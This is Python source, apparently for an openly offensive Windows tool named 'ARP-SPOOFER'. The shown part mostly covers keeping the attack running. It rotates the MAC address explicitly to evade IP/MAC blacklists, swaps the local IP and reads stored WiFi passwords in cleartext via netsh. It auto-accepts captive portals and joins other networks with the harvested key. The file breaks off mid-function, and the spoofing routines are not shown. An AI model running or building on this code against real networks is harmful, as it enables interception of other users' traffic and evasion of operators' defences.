import scapy.all as scapy
from scapy.layers import http
from scapy.config import conf
import time
import sys
import argparse
import socket
import os
import threading
import subprocess
import re
import random
import tempfile
import json
import atexit
import logging
import warnings
import urllib.request
import urllib.error
import urllib.parse
from datetime import datetime
from dataclasses import dataclass
from typing import Optional
from colorama import Fore, Style, init

init(autoreset=True)
conf.verb = 0
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
warnings.filterwarnings("ignore", message=".*Ethernet destination MAC.*")

title = "ARP-SPOOFER - LTX74"
if os.name == "nt":
    os.system(f"title {title}")
else:
    sys.stdout.write(f"\x1b]2;{title}\x07")

CHECK_INTERVAL = 30
TARGET_REFRESH_INTERVAL = 300
TARGET_MAC_REFRESH_INTERVAL = 180
SPOOF_INTERVAL = 2
INTERNET_CHECK_TIMEOUT = 5
INTERNET_CACHE_TTL = 15
RECOVERY_COOLDOWN = 120
LOG_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "logs")

conf.verb = 0
logging.getLogger("scapy").setLevel(logging.ERROR)
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
warnings.filterwarnings("ignore", message=".*MAC address.*ARP.*")
warnings.filterwarnings("ignore", category=UserWarning, module="scapy.*")

_session_logger: Optional["SessionLogger"] = None


@dataclass
class NetworkContext:
    ip: str = ""
    gateway: str = ""
    ip_range: str = ""
    gateway_mac: Optional[str] = None
    interface_name: str = ""
    ssid: str = ""
    wifi_password: str = ""
    wifi_auth: str = ""
    is_wifi: bool = False


@dataclass
class WifiNetwork:
    ssid: str
    bssid: str
    signal: int
    auth: str
    open_network: bool


def get_gradient_color(step, total_steps):
    colors = [129, 135, 141, 147, 153, 159, 231, 255]
    index = int((step / total_steps) * (len(colors) - 1))
    return f"\033[38;5;{colors[index]}m"


def print_banner():
    os.system("cls" if os.name == "nt" else "clear")
    lines = [
        " █████╗ ██████╗ ██████╗       ███████╗██████╗  ██████╗  ██████╗ ███████╗███████╗██████╗ ",
        "██╔══██╗██╔══██╗██╔══██╗      ██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝██╔════╝██╔══██╗",
        "███████║██████╔╝██████╔╝█████╗███████╗██████╔╝██║   ██║██║   ██║█████╗  █████╗  ██████╔╝",
        "██╔══██║██╔══██╗██╔═══╝ ╚════╝╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝  ██╔══╝  ██╔══██╗",
        "██║  ██║██║  ██║██║           ███████║██║     ╚██████╔╝╚██████╔╝██║     ███████╗██║  ██║",
        "╚═╝  ╚═╝╚═╝  ╚═╝╚═╝           ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝",
    ]
    for i, line in enumerate(lines):
        print(get_gradient_color(i, len(lines)) + line)
    print(f"\n{Fore.MAGENTA}{Style.BRIGHT}ARP-SPOOFER | By LTX")


def run_cmd(cmd, timeout=30, encoding=None):
    try:
        enc = encoding or ("cp850" if os.name == "nt" else "utf-8")
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
            encoding=enc,
            errors="replace",
        )
        return result.returncode == 0, (result.stdout or "") + (result.stderr or "")
    except (subprocess.TimeoutExpired, Exception) as exc:
        return False, str(exc)


def run_netsh(cmd, timeout=30):
    """netsh on French Windows outputs UTF-8 (NBSP before colons)."""
    ok, out = run_cmd(cmd, timeout=timeout, encoding="utf-8")
    if out.strip():
        return ok, out
    return run_cmd(cmd, timeout=timeout, encoding="cp850")


def extract_wifi_profile_ssid(line: str) -> Optional[str]:
    low = line.lower()
    if "profil tous les utilisateurs" not in low and "all user profile" not in low:
        return None
    if ":" not in line:
        return None
    ssid = line.split(":", 1)[1].strip()
    return ssid or None


def log_info(msg):
    print(f"{Fore.LIGHTCYAN_EX}[*] {msg}")
    if _session_logger:
        _session_logger.write("INFO", msg)


def log_ok(msg):
    print(f"{Fore.GREEN}[+] {msg}")
    if _session_logger:
        _session_logger.write("OK", msg)


def log_warn(msg):
    print(f"{Fore.YELLOW}[!] {msg}")
    if _session_logger:
        _session_logger.write("WARN", msg)


def log_err(msg):
    print(f"{Fore.RED}[-] {msg}")
    if _session_logger:
        _session_logger.write("ERROR", msg)


class SessionLogger:
    def __init__(self, log_path: Optional[str] = None):
        os.makedirs(LOG_DIR, exist_ok=True)
        if log_path:
            self.path = log_path
        else:
            stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            self.path = os.path.join(LOG_DIR, f"session_{stamp}.log")
        self._lock = threading.Lock()
        self.write("INFO", "Session started")

    def write(self, level: str, msg: str):
        line = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{level}] {msg}\n"
        with self._lock:
            with open(self.path, "a", encoding="utf-8") as fh:
                fh.write(line)


def check_admin_windows() -> bool:
    if os.name != "nt":
        return os.geteuid() == 0
    try:
        import ctypes
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def export_scan_results(devices: list[dict], output_path: str):
    ext = os.path.splitext(output_path)[1].lower()
    if ext == ".json":
        payload = {"scanned_at": datetime.now().isoformat(), "devices": devices}
        with open(output_path, "w", encoding="utf-8") as fh:
            json.dump(payload, fh, indent=2)
    else:
        with open(output_path, "w", encoding="utf-8") as fh:
            fh.write("ip,mac,hostname\n")
            for d in devices:
                fh.write(f"{d['ip']},{d['mac']},{d.get('name', 'Unknown')}\n")
    log_ok(f"Scan exported to {output_path}")


class NetworkResilience:
    """Windows-focused network detection, recovery and WiFi management."""

    CAPTIVE_KEYWORDS = (
        "accept", "accepter", "agree", "connect", "connexion", "login",
        "valider", "continuer", "continue", "terms", "conditions", "submit",
        "j'accepte", "autoriser", "authorize", "get online", "click to",
    )

    def __init__(self, initial_ctx: NetworkContext):
        self.initial_ctx = initial_ctx
        self.ctx = NetworkContext(**initial_ctx.__dict__)
        self._lock = threading.Lock()
        self._recovery_in_progress = False
        self._last_recovery = 0.0
        self._internet_cache: tuple[bool, float] = (False, 0.0)
        self._recovery_count = 0

    def capture_initial_wifi(self):
        if os.name != "nt":
            return
        ok, out = run_cmd("netsh wlan show interfaces")
        if self._is_location_blocked(out):
            ok, out = run_cmd(
                'powershell -NoProfile -Command '
                '"Get-NetConnectionProfile | Select-Object Name, InterfaceAlias | '
                'ForEach-Object { $_.InterfaceAlias + \'|\' + $_.Name }"'
            )
            if ok and "|" in out:
                for line in out.splitlines():
                    if "|" in line:
                        iface, ssid = line.split("|", 1)
                        self.initial_ctx.is_wifi = True
                        self.initial_ctx.ssid = ssid.strip()
                        self.initial_ctx.interface_name = iface.strip()
                        break
        else:
            ssid = self._parse_value(out, "SSID")
            if not ssid or ssid == "N/A":
                return
            self.initial_ctx.is_wifi = True
            self.initial_ctx.ssid = ssid
            self.initial_ctx.interface_name = self._parse_value(out, "Name") or ""
            self.initial_ctx.wifi_auth = self._parse_value(out, "Authentication") or ""
            if not self.initial_ctx.wifi_auth:
                self.initial_ctx.wifi_auth = self._parse_value(out, "Authentification") or ""

        if not self.initial_ctx.ssid:
            return
        password = self._get_wifi_password(self.initial_ctx.ssid)
        if password:
            self.initial_ctx.wifi_password = password
        self.ctx = NetworkContext(**self.initial_ctx.__dict__)
        log_info(f"WiFi profile saved: {self.initial_ctx.ssid}")

    def refresh_context(self) -> NetworkContext:
        with self._lock:
            ip, gateway, ip_range = self._detect_network()
            if ip:
                self.ctx.ip = ip
            if gateway:
                self.ctx.gateway = gateway
            if ip_range:
                self.ctx.ip_range = ip_range
            if self.ctx.gateway:
                self.ctx.gateway_mac = get_mac(self.ctx.gateway)
            return NetworkContext(**self.ctx.__dict__)

    def has_internet(self, use_cache: bool = True) -> bool:
        if use_cache:
            cached, ts = self._internet_cache
            if time.time() - ts < INTERNET_CACHE_TTL:
                return cached

        result = self._probe_internet()
        self._internet_cache = (result, time.time())
        return result

    def _probe_internet(self) -> bool:
        probes = [
            ("8.8.8.8", 53),
            ("1.1.1.1", 53),
            ("208.67.222.222", 53),
        ]
        for host, port in probes:
            try:
                with socket.create_connection((host, port), timeout=INTERNET_CHECK_TIMEOUT):
                    return True
            except OSError:
                continue

        urls = [
            "http://connectivitycheck.gstatic.com/generate_204",
            "http://www.msftconnecttest.com/connecttest.txt",
            "http://captive.apple.com/hotspot-detect.html",
        ]
        for url in urls:
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=INTERNET_CHECK_TIMEOUT) as resp:
                    if resp.status in (200, 204):
                        body = resp.read(512).decode("utf-8", errors="ignore").lower()
                        if "success" in body or "microsoft connect test" in body or resp.status == 204:
                            return True
            except urllib.error.HTTPError as exc:
                if exc.code in (200, 204):
                    return True
            except Exception:
                continue
        return False

    def needs_captive_portal(self) -> bool:
        try:
            req = urllib.request.Request(
                "http://neverssl.com/",
                headers={"User-Agent": "Mozilla/5.0"},
            )
            with urllib.request.urlopen(req, timeout=INTERNET_CHECK_TIMEOUT) as resp:
                final_url = resp.geturl().lower()
                html = resp.read(4096).decode("utf-8", errors="ignore").lower()
                if any(k in final_url for k in ("login", "portal", "hotspot", "wifi", "captive")):
                    return True
                if any(k in html for k in ("captive", "hotspot", "terms", "conditions", "accept")):
                    return True
        except Exception:
            pass
        return not self.has_internet()

    def handle_captive_portal(self) -> bool:
        log_info("Attempting captive portal acceptance...")
        test_urls = [
            "http://neverssl.com/",
            "http://connectivitycheck.gstatic.com/generate_204",
            "http://www.msftconnecttest.com/redirect",
            "http://captive.apple.com/hotspot-detect.html",
        ]
        for url in test_urls:
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=INTERNET_CHECK_TIMEOUT) as resp:
                    portal_url = resp.geturl()
                    html = resp.read(32768).decode("utf-8", errors="ignore")
                    if self._submit_captive_form(portal_url, html):
                        time.sleep(3)
                        if self.has_internet(use_cache=False):
                            log_ok("Captive portal accepted.")
                            return True
                    if self._click_captive_links(portal_url, html):
                        time.sleep(3)
                        if self.has_internet(use_cache=False):
                            log_ok("Captive portal accepted via link.")
                            return True
            except Exception:
                continue

        for url in test_urls:
            if self._try_common_captive_posts(url):
                time.sleep(3)
                if self.has_internet(use_cache=False):
                    log_ok("Captive portal accepted via fallback POST.")
                    return True
        log_warn("Could not auto-accept captive portal.")
        return False

    def recover_connectivity(self) -> bool:
        if self._recovery_in_progress:
            return False
        elapsed = time.time() - self._last_recovery
        if elapsed < RECOVERY_COOLDOWN:
            log_warn(f"Recovery cooldown ({int(RECOVERY_COOLDOWN - elapsed)}s remaining).")
            return False

        self._recovery_in_progress = True
        self._last_recovery = time.time()
        self._recovery_count += 1
        try:
            log_warn("Internet lost — starting recovery sequence...")
            methods = [
                self._method_dhcp_renew,
                self._method_change_local_ip,
                self._method_randomize_mac,
                self._method_adapter_reset,
                self._method_wifi_reconnect,
                self._method_wifi_scan_and_connect,
            ]
            for method in methods:
                log_info(f"Trying: {method.__name__}...")
                try:
                    if method():
                        self.refresh_context()
                        if self.needs_captive_portal():
                            self.handle_captive_portal()
                        if self.has_internet():
                            log_ok(f"Connectivity restored via {method.__name__}.")
                            return True
                except Exception as exc:
                    log_warn(f"{method.__name__} failed: {exc}")
                time.sleep(2)
            log_err("All recovery methods exhausted.")
            return False
        finally:
            self._recovery_in_progress = False
            self._internet_cache = (False, 0.0)

    def display_wifi_scan(self):
        networks = self.scan_wifi_networks()
        if not networks:
            log_warn("No WiFi networks detected.")
            return
        seen = set()
        unique = []
        for n in networks:
            key = (n.ssid, n.bssid)
            if key not in seen:
                seen.add(key)
                unique.append(n)
        unique.sort(key=lambda n: n.signal, reverse=True)

        print(f"\n{Fore.WHITE}┌{'─' * 22}┬{'─' * 20}┬{'─' * 10}┬{'─' * 28}┐")
        print(f"{Fore.WHITE}│ {'SSID':<20} │ {'BSSID':<18} │ {'Signal':<8} │ {'Auth':<26} │")
        print(f"{Fore.WHITE}├{'─' * 22}┼{'─' * 20}┼{'─' * 10}┼{'─' * 28}┤")
        for n in unique:
            auth = n.auth[:26]
            sig = f"{n.signal}%" if n.signal else "N/A"
            if n.open_network:
                open_tag = f"{Fore.GREEN}OPEN"
            elif n.bssid == "(connecte)":
                open_tag = f"{Fore.CYAN}ACTIF"
            elif n.bssid == "(profil sauvegarde)":
                open_tag = f"{Fore.YELLOW}SAUVE"
            else:
                open_tag = f"{Fore.YELLOW}SECURED"
            print(
                f"{Fore.WHITE}│ {Fore.CYAN}{n.ssid[:20]:<20} {Fore.WHITE}│ "
                f"{Fore.LIGHTBLACK_EX}{n.bssid[:18]:<18} {Fore.WHITE}│ "
                f"{Fore.GREEN}{sig:<8} {Fore.WHITE}│ "
                f"{open_tag} {auth[:18]:<18} {Fore.WHITE}│"
            )
        print(f"{Fore.WHITE}└{'─' * 22}┴{'─' * 20}┴{'─' * 10}┴{'─' * 28}┘")
        log_ok(f"WiFi scan: {len(unique)} network(s) found.")

    def _method_randomize_mac(self) -> bool:
        """Rotate adapter MAC to evade IP/MAC blacklists (Windows)."""
        if os.name != "nt":
            return False
        iface = self.ctx.interface_name or self._get_active_interface()
        if not iface:
            return False
        new_mac = "".join(f"{random.randint(0, 255):02x}" for _ in range(6))
        new_mac = "02" + new_mac[2:]
        log_info(f"Rotating MAC on {iface} -> {new_mac}")
        run_cmd(f'netsh interface set interface name="{iface}" admin=disable')
        time.sleep(2)
        reg_path = r"HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}"
        ok, out = run_cmd(
            f'powershell -Command "Get-ChildItem {reg_path} -ErrorAction SilentlyContinue | '
            f'ForEach-Object {{ $p = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue; '
            f'if ($p.NetCfgInstanceId -and (Get-NetAdapter -InterfaceGuid $p.NetCfgInstanceId '
            f'-ErrorAction SilentlyContinue).Name -eq \'{iface}\') '
            f'{{ Set-ItemProperty -Path $_.PSPath -Name NetworkAddress -Value \'{new_mac.replace(":", "")}\'; '
            f'Write-Output OK }} }}"'
        )
        run_cmd(f'netsh interface set interface name="{iface}" admin=enable')
        time.sleep(5)
        if ok and "OK" in out:
            self._method_dhcp_renew()
            return self.has_internet(use_cache=False)
        return False

    def scan_wifi_networks(self) -> list[WifiNetwork]:
        if os.name != "nt":
            return []

        iface = self._get_wifi_interface_name()
        if iface:
            _, out = run_netsh(f'netsh wlan show networks mode=bssid interface="{iface}"')
        else:
            _, out = run_netsh("netsh wlan show networks mode=bssid")

        if self._is_location_blocked(out):
            self._warn_location_required()
            return self._scan_wifi_fallback()

        networks = self._parse_wifi_scan(out)
        if not networks:
            _, out2 = run_netsh("netsh wlan show networks")
            if not self._is_location_blocked(out2):
                networks = self._parse_wifi_scan(out2)

        return networks if networks else self._scan_wifi_fallback()

    def _is_location_blocked(self, text: str) -> bool:
        if not text:
            return True
        markers = (
            "autorisation de localisation",
            "services de localisation",
            "location permission",
            "location services",
            "privacy-location",
            "ms-settings:privacy-location",
            "wlanqueryinterface",
            "nécessitent une autorisation",
            "necessitent une autorisation",
            "interpréteur de commandes réseau",
            "network commands need location",
        )
        low = text.lower()
        return any(m in low for m in markers)

    def _warn_location_required(self):
        log_warn("Windows bloque le scan WiFi live sans la Localisation activee.")
        log_warn("Parametres > Confidentialite et securite > Localisation > ACTIVER")
        log_warn("Cochez aussi : 'Autoriser les applications de bureau a acceder a votre position'")
        log_info("Affichage des profils WiFi sauvegardes en attendant...")
        run_cmd("start ms-settings:privacy-location")

    def _get_wifi_interface_name(self) -> str:
        _, out = run_netsh("netsh wlan show profiles")
        match = re.search(r"interface\s+(.+?)\s*:", out, re.I)
        if match:
            return match.group(1).strip()
        ok, out = run_cmd(
            'powershell -NoProfile -Command '
            '"(Get-NetConnectionProfile | Select-Object -First 1).InterfaceAlias"'
        )
        if ok and out.strip():
            return out.strip()
        return self.ctx.interface_name or self._get_active_interface()

    def _scan_wifi_fallback(self) -> list[WifiNetwork]:
        """Fallback when Windows blocks live scan (location off). Uses saved profiles + current connection."""
        networks: list[WifiNetwork] = []
        seen: set[str] = set()

        ok, out = run_cmd(
            'powershell -NoProfile -Command '
            '"Get-NetConnectionProfile | ForEach-Object { $_.Name + \'|\' + $_.InterfaceAlias }"'
        )
        if ok:
            for line in out.splitlines():
                if "|" not in line:
                    continue
                ssid, iface = line.split("|", 1)
                ssid = ssid.strip()
                if ssid and ssid not in seen:
                    seen.add(ssid)
                    networks.append(
                        WifiNetwork(
                            ssid=ssid,
                            bssid="(connecte)",
                            signal=100,
                            auth="Reseau actuel",
                            open_network=False,
                        )
                    )

        ok, out = run_netsh("netsh wlan show profiles")
        if ok or out.strip():
            for line in out.splitlines():
                ssid = extract_wifi_profile_ssid(line)
                if ssid and ssid not in seen:
                    seen.add(ssid)
                    auth = "Profil enregistre"
                    ok2, profile_out = run_netsh(f'netsh wlan show profile name="{ssid}"')
                    if ok2:
                        auth_val = self._parse_value(profile_out, "Authentification")
                        if not auth_val:
                            auth_val = self._parse_value(profile_out, "Authentication")
                        if auth_val:
                            auth = auth_val
                    networks.append(
                        WifiNetwork(
                            ssid=ssid,
                            bssid="(profil sauvegarde)",
                            signal=0,
                            auth=auth,
                            open_network="ouvert" in auth.lower() or "open" in auth.lower(),
                        )
                    )

        if networks:
            log_info(
                "Scan WiFi limite — profils sauvegardes + reseau actuel affiches."
            )
            log_info(
                "Pour voir TOUS les reseaux a proximite, activez la Localisation Windows."
            )
        return networks

    def _method_dhcp_renew(self) -> bool:
        iface = self.ctx.interface_name or self._get_active_interface()
        if os.name == "nt":
            if iface:
                run_cmd(f'netsh interface ip set address name="{iface}" source=dhcp')
            run_cmd("ipconfig /release")
            time.sleep(1)
            run_cmd("ipconfig /renew")
            run_cmd("ipconfig /flushdns")
        else:
            run_cmd("sudo dhclient -r")
            run_cmd("sudo dhclient")
        return self.has_internet()

    def _method_change_local_ip(self) -> bool:
        if not self.ctx.ip or not self.ctx.gateway:
            self.refresh_context()
        if not self.ctx.ip or not self.ctx.gateway:
            return False
        parts = self.ctx.ip.split(".")
        if len(parts) != 4:
            return False
        subnet = ".".join(parts[:3])
        new_host = random.randint(2, 254)
        while f"{subnet}.{new_host}" == self.ctx.ip:
            new_host = random.randint(2, 254)
        new_ip = f"{subnet}.{new_host}"
        iface = self.ctx.interface_name or self._get_active_interface()
        if not iface:
            return False
        mask = "255.255.255.0"
        gateway = self.ctx.gateway
        ok, _ = run_cmd(
            f'netsh interface ip set address name="{iface}" static {new_ip} {mask} {gateway}'
        )
        if ok:
            log_ok(f"Local IP changed to {new_ip}")
            self.ctx.ip = new_ip
            self.ctx.ip_range = f"{subnet}.0/24"
            time.sleep(2)
            return self.has_internet()
        return False

    def _method_adapter_reset(self) -> bool:
        iface = self.ctx.interface_name or self._get_active_interface()
        if not iface or os.name != "nt":
            return False
        run_cmd(f'netsh interface set interface name="{iface}" admin=disable')
        time.sleep(3)
        run_cmd(f'netsh interface set interface name="{iface}" admin=enable')
        time.sleep(5)
        self._method_dhcp_renew()
        return self.has_internet()

    def _method_wifi_reconnect(self) -> bool:
        if not self.initial_ctx.is_wifi or not self.initial_ctx.ssid:
            return False
        return self._connect_wifi(
            self.initial_ctx.ssid,
            self.initial_ctx.wifi_password,
            self.initial_ctx.wifi_auth,
        )

    def _method_wifi_scan_and_connect(self) -> bool:
        networks = self.scan_wifi_networks()
        if not networks:
            log_warn("No WiFi networks found during scan.")
            return False

        candidates = self._rank_wifi_candidates(networks)
        for net in candidates[:8]:
            password = ""
            if not net.open_network:
                password = self.initial_ctx.wifi_password
            log_info(f"Trying WiFi: {net.ssid} ({net.auth}, signal {net.signal}%)")
            if self._connect_wifi(net.ssid, password, net.auth):
                time.sleep(4)
                if self.needs_captive_portal():
                    self.handle_captive_portal()
                if self.has_internet() or self._local_network_ok():
                    return True
        return False

    def _rank_wifi_candidates(self, networks: list[WifiNetwork]) -> list[WifiNetwork]:
        initial_ssid = self.initial_ctx.ssid.lower()
        initial_bssid_prefix = ""
        if self.initial_ctx.is_wifi:
            ok, out = run_cmd("netsh wlan show interfaces")
            bssid = self._parse_value(out, "BSSID")
            if bssid:
                initial_bssid_prefix = bssid[:8].lower()

        def score(net: WifiNetwork) -> tuple:
            ssid_low = net.ssid.lower()
            same_ssid = ssid_low == initial_ssid
            similar_ssid = initial_ssid and (initial_ssid in ssid_low or ssid_low in initial_ssid)
            same_oui = (
                initial_bssid_prefix
                and net.bssid[:8].lower() == initial_bssid_prefix
            )
            open_bonus = 1 if net.open_network else 0
            return (
                1 if same_ssid else 0,
                1 if similar_ssid else 0,
                1 if same_oui else 0,
                open_bonus,
                net.signal,
            )

        return sorted(networks, key=score, reverse=True)

    def _connect_wifi(self, ssid: str, password: str, auth: str = "") -> bool:
        if os.name != "nt" or not ssid:
            return False
        self._ensure_wifi_profile(ssid, password, auth)
        ok, out = run_cmd(f'netsh wlan connect name="{ssid}" ssid="{ssid}"')
        if ok or "success" in out.lower():
            time.sleep(4)
            return True
        return False

    def _ensure_wifi_profile(self, ssid: str, password: str, auth: str):
        ok, out = run_cmd(f'netsh wlan show profile name="{ssid}"')
        if ok and "does not exist" not in out.lower():
            if password:
                run_cmd(
                    f'netsh wlan set profileparameter name="{ssid}" '
                    f'keyMaterial="{password}"'
                )
            return
        profile_xml = self._build_wifi_profile_xml(ssid, password, auth)
        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".xml", delete=False, encoding="utf-8"
        ) as tmp:
            tmp.write(profile_xml)
            tmp_path = tmp.name
        try:
            run_cmd(f'netsh wlan add profile filename="{tmp_path}"')
        finally:
            try:
                os.remove(tmp_path)
            except OSError:
                pass

    def _build_wifi_profile_xml(self, ssid: str, password: str, auth: str) -> str:
        auth_low = (auth or "").lower()
        is_open = "open" in auth_low or not password
        if is_open:
            auth_type, enc_type = "open", "none"
        elif "wpa3" in auth_low:
            auth_type, enc_type = "WPA3SAE", "AES"
        elif "wpa2" in auth_low or "wpa2-personal" in auth_low:
            auth_type, enc_type = "WPA2PSK", "AES"
        elif "wpa" in auth_low:
            auth_type, enc_type = "WPAPSK", "TKIP"
        else:
            auth_type, enc_type = "WPA2PSK", "AES"

        if is_open:
            security = f"""
            <security>
                <authEncryption>
                    <authentication>{auth_type}</authentication>
                    <encryption>{enc_type}</encryption>
                    <useOneX>false</useOneX>
                </authEncryption>
            </security>"""
        else:
            security = f"""
            <security>
                <authEncryption>
                    <authentication>{auth_type}</authentication>
                    <encryption>{enc_type}</encryption>
                    <useOneX>false</useOneX>
                </authEncryption>
                <sharedKey>
                    <keyType>passPhrase</keyType>
                    <protected>false</protected>
                    <keyMaterial>{password}</keyMaterial>
                </sharedKey>
            </security>"""
        return f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig><SSID><name>{ssid}</name></SSID></SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>{security}
    </MSM>
</WLANProfile>"""

    def _submit_captive_form(self, page_url: str, html: str) -> bool:
        forms = re.findall(r"<form[^>]*>(.*?)</form>", html, re.I | re.S)
        for form_body in forms:
            action_m = re.search(r'action=["\']([^"\']*)["\']', form_body, re.I)
            action = action_m.group(1) if action_m else page_url
            if action.startswith("/"):
                parsed = urllib.parse.urlparse(page_url)
                action = f"{parsed.scheme}://{parsed.netloc}{action}"
            elif not action.startswith("http"):
                action = page_url

            fields = {}
            for inp in re.finditer(
                r'<input[^>]+name=["\']([^"\']+)["\'][^>]*>',
                form_body,
                re.I,
            ):
                tag = inp.group(0)
                name = inp.group(1)
                val_m = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
                input_type_m = re.search(r'type=["\']([^"\']*)["\']', tag, re.I)
                input_type = (input_type_m.group(1) if input_type_m else "").lower()
                if input_type in ("submit", "button", "image"):
                    val = val_m.group(1) if val_m else "1"
                    if any(k in (name + val).lower() for k in self.CAPTIVE_KEYWORDS):
                        fields[name] = val
                elif input_type not in ("password", "email", "text") or not val_m:
                    fields[name] = val_m.group(1) if val_m else ""

            if not fields:
                for inp in re.finditer(
                    r'<input[^>]+type=["\'](?:submit|button)["\'][^>]*>',
                    form_body,
                    re.I,
                ):
                    tag = inp.group(0)
                    name_m = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
                    val_m = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
                    if name_m:
                        fields[name_m.group(1)] = val_m.group(1) if val_m else "1"
                        break

            if fields:
                data = urllib.parse.urlencode(fields).encode("utf-8")
                req = urllib.request.Request(
                    action,
                    data=data,
                    headers={"User-Agent": "Mozilla/5.0"},
                    method="POST",
                )
                try:
                    urllib.request.urlopen(req, timeout=INTERNET_CHECK_TIMEOUT)
                    return True
                except Exception:
                    continue
        return False

    def _click_captive_links(self, page_url: str, html: str) -> bool:
        parsed_base = urllib.parse.urlparse(page_url)
        base = f"{parsed_base.scheme}://{parsed_base.netloc}"
        patterns = [
            r'<a[^>]+href=["\']([^"\']+)["\'][^>]*>([^<]*)</a>',
            r'<button[^>]*>([^<]*)</button>',
        ]
        for pattern in patterns:
            for match in re.finditer(pattern, html, re.I | re.S):
                if pattern.startswith("<a"):
                    href, text = match.group(1), match.group(2)
                    combined = (href + " " + text).lower()
                    if not any(k in combined for k in self.CAPTIVE_KEYWORDS):
                        continue
                    if href.startswith("/"):
                        href = base + href
                    elif not href.startswith("http"):
                        href = urllib.parse.urljoin(page_url, href)
                    try:
                        req = urllib.request.Request(href, headers={"User-Agent": "Mozilla/5.0"})
                        urllib.request.urlopen(req, timeout=INTERNET_CHECK_TIMEOUT)
                        return True
                    except Exception:
                        continue
                else:
                    text = match.group(1).lower()
                    if any(k in text for k in self.CAPTIVE_KEYWORDS):
                        try:
                            req = urllib.request.Request(page_url, headers={"User-Agent": "Mozilla/5.0"})
                            urllib.request.urlopen(req, timeout=INTERNET_CHECK_TIMEOUT)
                            return True
                        except Exception:
                            continue
        return False

    def _try_common_captive_posts(self, base_url: str) -> bool:
        parsed = urllib.parse.urlparse(base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        paths = ["/", "/login", "/portal", "/accept", "/connect", "/terms"]
        payloads = [
            {"accept": "1", "terms": "accepted"},
            {"action": "accept"},
            {"connect": "Connect"},
        ]
        for path in paths:
            for payload in payloads:
                try:
                    data = urllib.parse.urlencode(payload).encode("utf-8")
                    req = urllib.request.Request(
                        base + path,
                        data=data,
                        headers={"User-Agent": "Mozilla/5.0"},
                        method="POST",
                    )
                    urllib.request.urlopen(req, timeout=INTERNET_CHECK_TIMEOUT)
                    return True
                except Exception:
                    continue
        return False

    def _local_network_ok(self) -> bool:
        self.refresh_context()
        return bool(self.ctx.gateway and self.ctx.gateway_mac)

    def _detect_network(self) -> tuple[str, str, str]:
        ip_address = ""
        gateway = ""
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            ip_address = s.getsockname()[0]
        except OSError:
            ip_address = ""
        finally:
            s.close()

        if os.name == "nt":
            ok, output = run_cmd("route print 0.0.0.0")
            if ok:
                for line in output.splitlines():
                    if "0.0.0.0" in line and "Active Routes" not in line:
                        parts = line.split()
                        if len(parts) >= 3 and re.match(r"\d+\.\d+\.\d+\.\d+", parts[2]):
                            gateway = parts[2]
                            break
        else:
            ok, output = run_cmd("ip route | grep default")
            if ok:
                match = re.search(r"via\s+(\d+\.\d+\.\d+\.\d+)", output)
                if match:
                    gateway = match.group(1)

        ip_range = ""
        if ip_address and ip_address != "127.0.0.1":
            ip_range = ".".join(ip_address.split(".")[:-1]) + ".0/24"
        return ip_address, gateway, ip_range

    def _get_active_interface(self) -> str:
        if self.ctx.interface_name:
            return self.ctx.interface_name
        if os.name != "nt":
            return ""
        ok, out = run_cmd(
            'powershell -NoProfile -Command '
            '"(Get-NetRoute -DestinationPrefix \'0.0.0.0/0\' | Sort-Object RouteMetric | '
            'Select-Object -First 1).InterfaceAlias"'
        )
        if ok and out.strip():
            return out.strip()
        ok, out = run_cmd("netsh wlan show interfaces")
        if ok:
            name = self._parse_value(out, "Name")
            if name:
                return name
        ok, out = run_cmd("netsh interface show interface")
        if ok:
            for line in out.splitlines():
                if "Connected" in line or "Connecté" in line:
                    idx = line.find("Dedicated")
                    if idx == -1:
                        idx = line.find("Réseau")
                    if idx != -1:
                        return line[idx:].split(None, 1)[-1].strip()
        return ""

    def _get_wifi_password(self, ssid: str) -> str:
        ok, out = run_cmd(f'netsh wlan show profile name="{ssid}" key=clear')
        if not ok:
            return ""
        match = re.search(r"Key Content\s*:\s*(.+)", out, re.I)
        return match.group(1).strip() if match else ""

    def _parse_value(self, text: str, key: str) -> str:
        match = re.search(rf"{key}\s*:\s*(.+)", text, re.I)
        return match.group(1).strip() if match else ""

    def _parse_wifi_scan(self, output: str) -> list[WifiNetwork]:
        networks = []
        current_ssid = ""
        current_auth = ""
        current_signal = 0
        for line in output.splitlines():
            ssid_m = re.search(r"SSID\s+\d+\s*:\s*(.+)", line, re.I)
            if ssid_m:
                current_ssid = ssid_m.group(1).strip().strip('"')
                continue
            auth_m = re.search(
                r"(?:Authentication|Authentification)\s*:\s*(.+)", line, re.I
            )
            if auth_m:
                current_auth = auth_m.group(1).strip()
                continue
            sig_m = re.search(r"Signal\s*:\s*(\d+)\s*%", line, re.I)
            if sig_m:
                current_signal = int(sig_m.group(1))
                continue
            bssid_m = re.search(r"BSSID\s+\d+\s*:\s*([0-9a-f:]+)", line, re.I)
            if bssid_m and current_ssid:
                networks.append(
                    WifiNetwork(
                        ssid=current_ssid,
                        bssid=bssid_m.group(1).lower(),
                        signal=current_signal,
                        auth=current_auth,
